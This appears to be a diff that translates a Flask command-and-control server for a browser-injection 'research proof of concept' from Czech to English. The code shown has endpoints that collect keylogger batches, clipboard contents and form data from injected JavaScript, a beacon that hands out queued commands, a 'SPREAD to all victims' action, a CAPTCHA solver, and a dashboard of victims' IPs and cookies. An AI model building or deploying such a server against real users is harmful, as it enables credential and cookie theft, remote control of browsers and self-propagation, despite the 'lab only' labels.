@@ -1,35 +1,35 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-C2 / sběrný server (LAB-ONLY) pro výzkumný PoC.
+C2 / collection server (LAB ONLY) for a research proof of concept.
 
-Bezpečnostní vlastnosti této sanitizované verze:
-  * BIND na 127.0.0.1 (default) — server NENÍ dosažitelný z internetu.
-  * Řídicí a výstupní endpointy (/ , /export, /spread, /cmd) vyžadují TOKEN.
-    Token se vygeneruje automaticky při startu (nebo nastav C2_TOKEN env).
-  * /solve (OCR captchy) má rate-limit na IP.
-  * Žádná vazba na konkrétní web — payload si adresu C2 nese sám.
+Security properties of this sanitized version:
+  * Binds to 127.0.0.1 by default; the server is not exposed to the internet.
+  * Control and export endpoints (/, /export, /spread, /cmd) require a token.
+    A token is generated at startup, or can be set with the C2_TOKEN env var.
+  * /solve (CAPTCHA OCR) is rate-limited per IP.
+  * No binding to a specific website; the payload carries its own C2 address.
 
-Spuštění:
+Run:
     pip install flask pillow numpy
     python3 c2.py
-    # → vypíše TOKEN, který používej v dashboardu a pro řízení
+    # -> prints the TOKEN used by the dashboard and control endpoints
 
-Endpointy pro injektovaný JS (lab payload):
-    GET /hello?vid=&co=&u=   -> registrace session
+Endpoints for injected JS (lab payload):
+    GET /hello?vid=&co=&u=   -> register session
     GET /k?k=<batch>         -> keylogger (batch)
-    GET /p?p=<paste>         -> schránka
-    GET /f?d=<form>          -> formulář
-    GET /beacon?vid=...      -> heartbeat + příkaz (JSON)
-    GET /solve?img=<b64>     -> OCR captchy -> {digits, sum}
+    GET /p?p=<paste>         -> clipboard
+    GET /f?d=<form>          -> form data
+    GET /beacon?vid=...      -> heartbeat + command (JSON)
+    GET /solve?img=<b64>     -> CAPTCHA OCR -> {digits, sum}
 
-Chráněné (token):
+Protected (token):
     GET /                    -> dashboard
     GET /export              -> JSON dump
-    GET /spread?token=       -> SPREAD všem obětem
+    GET /spread?token=       -> queue SPREAD for all victims
     GET /cmd?vid=&cmd=&token=
 
-Data: SQLite c2.sqlite3 (lokální soubor).
+Data: SQLite c2.sqlite3 (local file).
 """
 import os
 import io
@@ -77,7 +77,7 @@ def protected(fn):
 
 @app.after_request
 def cors(resp):
-    # Lab: payload na lab.local volá XHR na C2 (cross-origin). Omez v produkci.
+    # Lab payloads on lab.local call C2 cross-origin. Restrict this in production.
     resp.headers["Access-Control-Allow-Origin"] = "*"
     return resp
 
@@ -138,7 +138,7 @@ def pop_cmd(vid):
         return row["cmd"]
     c.close(); return None
 
-# --------------------------------------------------------------- captcha OCR
+# --------------------------------------------------------------- CAPTCHA OCR
 def _mask(im):
     a = np.asarray(im.convert("RGB")).astype(np.int16)
     return (a[:, :, 0] > 130) & (a[:, :, 1] > 130) & (a[:, :, 2] > 130)
@@ -195,7 +195,7 @@ def solve_captcha(img_bytes):
     f2 = [int(c) for c in s[:2] if c.isdigit()]
     return s, (sum(f2) if len(f2) == 2 else None)
 
-# ------------------------------------------------- collector (otevřené, lab)
+# ------------------------------------------------- collector (open, lab only)
 @app.route("/hello")
 def hello():
     vid = request.args.get("vid") or (request.remote_addr or "unknown")
@@ -259,7 +259,7 @@ def spread():
 def cmd():
     vid, val = request.args.get("vid", ""), request.args.get("cmd", "")
     if not vid or not val:
-        return jsonify({"error": "vid a cmd jsou povinné"}), 400
+        return jsonify({"error": "vid and cmd are required"}), 400
     queue_cmd(vid, val)
     return jsonify({"ok": True, "vid": vid, "cmd": val})
 
@@ -293,12 +293,12 @@ def dashboard():
 table{{border-collapse:collapse;margin:10px 0}}td,th{{border:1px solid #333;padding:3px 6px}}
 h2{{color:#6cf}}a{{color:#fd0}}</style>
 <h1>LAB C2 — token-protected</h1>
-<p><a href="/export?token={TOKEN}">export JSON</a> |
-<a href="/spread?token={TOKEN}">SPREAD všem obětem</a></p>
-<h2>Oběti ({len(victims)})</h2><table>
-<tr><th>vid</th><th>first</th><th>last</th><th>ip</th><th>ua</th><th>cookie</th><th>spread</th></tr>
+<p><a href="/export?token={TOKEN}">Export JSON</a> |
+<a href="/spread?token={TOKEN}">SPREAD to all victims</a></p>
+<h2>Victims ({len(victims)})</h2><table>
+<tr><th>vid</th><th>first seen</th><th>last seen</th><th>IP</th><th>UA</th><th>cookie</th><th>spread</th></tr>
 {rows}</table>
-<h2>Události (posledních 200)</h2><table>
+<h2>Events (latest 200)</h2><table>
 <tr><th>ts</th><th>vid</th><th>kind</th><th>data</th></tr>{ev}</table>"""
     return Response(html, mimetype="text/html")
 
@@ -307,7 +307,7 @@ def _t(ts):
     except Exception: return ""
 
 if __name__ == "__main__":
-    print(f"[*] C2 (LAB-ONLY) běží na http://{BIND}:{PORT}")
+    print(f"[*] C2 (LAB ONLY) listening on http://{BIND}:{PORT}")
     print(f"[*] TOKEN: {TOKEN}")
-    print(f"[*] dashboard: http://127.0.0.1:{PORT}/?token={TOKEN}")
+    print(f"[*] Dashboard: http://127.0.0.1:{PORT}/?token={TOKEN}")
     app.run(host=BIND, port=PORT, threaded=True)
